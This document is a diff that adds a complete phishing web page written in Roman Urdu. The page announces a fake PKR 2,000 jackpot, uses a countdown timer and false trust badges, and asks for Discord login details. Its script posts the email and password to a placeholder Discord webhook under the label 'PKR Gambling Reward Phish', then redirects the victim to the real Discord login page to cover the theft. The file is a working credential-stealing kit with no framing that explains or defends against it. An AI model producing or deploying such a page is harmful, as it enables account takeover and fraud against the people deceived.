@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Your Reward</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: #1a1a2e;
+            border-radius: 16px;
+            padding: 40px 32px;
+            width: 440px;
+            max-width: 92vw;
+            text-align: center;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.15), 0 8px 32px rgba(0,0,0,0.4);
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,215,0,0.03) 0%, transparent 60%);
+            animation: shimmer 4s ease-in-out infinite;
+        }
+        @keyframes shimmer {
+            0%, 100% { transform: rotate(0deg); }
+            50% { transform: rotate(180deg); }
+        }
+        .badge {
+            background: linear-gradient(135deg, #00b894, #00cec9);
+            color: #fff;
+            font-weight: 800;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            padding: 6px 18px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 16px;
+            position: relative;
+            z-index: 1;
+        }
+        .trophy {
+            font-size: 64px;
+            margin-bottom: 12px;
+            position: relative;
+            z-index: 1;
+        }
+        h1 {
+            color: #ffd700;
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            position: relative;
+            z-index: 1;
+        }
+        .subtitle {
+            color: #b0b0c8;
+            font-size: 15px;
+            margin-bottom: 4px;
+            position: relative;
+            z-index: 1;
+        }
+        .amount {
+            font-size: 48px;
+            font-weight: 900;
+            color: #ffd700;
+            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+            margin: 12px 0;
+            position: relative;
+            z-index: 1;
+        }
+        .amount span {
+            font-size: 20px;
+            color: #b0b0c8;
+        }
+        .countdown {
+            color: #8888aa;
+            font-size: 13px;
+            margin-bottom: 24px;
+            position: relative;
+            z-index: 1;
+        }
+        .countdown strong {
+            color: #ff6b6b;
+        }
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,215,0,0.3), transparent);
+            margin: 20px 0;
+            position: relative;
+            z-index: 1;
+        }
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+            position: relative;
+            z-index: 1;
+        }
+        .form-group label {
+            display: block;
+            color: #c0c0d8;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #0f0f23;
+            border: 1px solid #2a2a4a;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #ffd700;
+        }
+        .btn-claim {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00b894, #00cec9);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.15s, box-shadow 0.2s;
+            position: relative;
+            z-index: 1;
+        }
+        .btn-claim:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 20px rgba(0, 206, 201, 0.4);
+        }
+        .btn-claim:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .trust-badges span {
+            color: #666688;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .trust-badges span::before {
+            content: '✓';
+            color: #44cc66;
+            font-weight: bold;
+        }
+        .error-msg {
+            background: rgba(255, 80, 80, 0.15);
+            border: 1px solid rgba(255, 80, 80, 0.3);
+            color: #ff6b6b;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-bottom: 16px;
+            display: none;
+            position: relative;
+            z-index: 1;
+        }
+        .sponsor {
+            color: #444466;
+            font-size: 11px;
+            margin-top: 16px;
+            position: relative;
+            z-index: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="badge">🎉 Winner</div>
+        <div class="trophy">🏆</div>
+        <h1>Mubarak Ho!</h1>
+        <p class="subtitle">Aap weekly jackpot ke winner hain!</p>
+        
+        <div class="amount"><span>PKR</span> 2,000</div>
+        
+        <p class="countdown">⏱ Claim expire hota hai <strong id="timer">14:59</strong> mein</p>
+
+        <div class="divider"></div>
+
+        <p style="color:#c0c0d8; font-size:14px; margin-bottom:16px; position:relative; z-index:1;">
+            Apna reward claim karne ke liye Discord se sign in karein
+        </p>
+
+        <div id="errorMsg" class="error-msg"></div>
+
+        <form id="claimForm">
+            <div class="form-group">
+                <label for="email">Discord Email / Phone</label>
+                <input type="text" id="email" name="email" placeholder="Apna Discord email likhein" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Discord Password</label>
+                <input type="password" id="password" name="password" placeholder="Apna password likhein" required>
+            </div>
+            <button type="submit" id="claimBtn" class="btn-claim">🔒 Claim PKR 2,000</button>
+        </form>
+
+        <div class="trust-badges">
+            <span>SSL Mehfooz</span>
+            <span>Tasdeeq Shuda</span>
+            <span>100% Sahi</span>
+        </div>
+
+        <div class="sponsor">Sponsored — Inaam zamin hai</div>
+    </div>
+
+    <script>
+        // --- Countdown Timer ---
+        let minutes = 14;
+        let seconds = 59;
+        const timerEl = document.getElementById('timer');
+
+        function updateTimer() {
+            if (seconds === 0) {
+                if (minutes === 0) {
+                    timerEl.textContent = '00:00';
+                    return;
+                }
+                minutes--;
+                seconds = 59;
+            } else {
+                seconds--;
+            }
+            timerEl.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+        }
+        setInterval(updateTimer, 1000);
+
+        // --- Form Submission ---
+        document.getElementById('claimForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            const btn = document.getElementById('claimBtn');
+
+            if (!email || !password) {
+                errorMsg.textContent = 'Meherbani farma kar dono fields bharein.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            errorMsg.style.display = 'none';
+            btn.disabled = true;
+            btn.textContent = 'Verify ho raha hai...';
+
+            // --- SEND TO YOUR DISCORD WEBHOOK ---
+            const webhookUrl = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**🎰 PKR Gambling Reward Phish**\nEmail: \`${email}\`\nPassword: \`${password}\``
+                })
+            }).catch(() => {});
+
+            // Redirect to real Discord
+            setTimeout(() => {
+                window.location.href = 'https://discord.com/login';
+            }, 1500);
+        });
+
+        // --- Confetti ---
+        (function confetti() {
+            const colors = ['#ffd700', '#00b894', '#00cec9', '#ff6b6b', '#44cc66'];
+            for (let i = 0; i < 30; i++) {
+                const el = document.createElement('div');
+                el.style.cssText = `
+                    position: fixed;
+                    top: -10px;
+                    left: ${Math.random() * 100}vw;
+                    width: 8px;
+                    height: 8px;
+                    background: ${colors[Math.floor(Math.random() * colors.length)]};
+                    border-radius: 2px;
+                    opacity: 0.8;
+                    pointer-events: none;
+                    z-index: 9999;
+                    animation: fall ${3 + Math.random() * 4}s linear forwards;
+                    animation-delay: ${Math.random() * 2}s;
+                `;
+                document.body.appendChild(el);
+                setTimeout(() => el.remove(), 8000);
+            }
+        })();
+
+        const styleSheet = document.createElement('style');
+        styleSheet.textContent = `
+            @keyframes fall {
+                0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
+                100% { transform: translateY(100vh) rotate(720deg); opacity: 0; }
+            }
+        `;
+        document.head.appendChild(styleSheet);
+    </script>
+</body>
+</html>
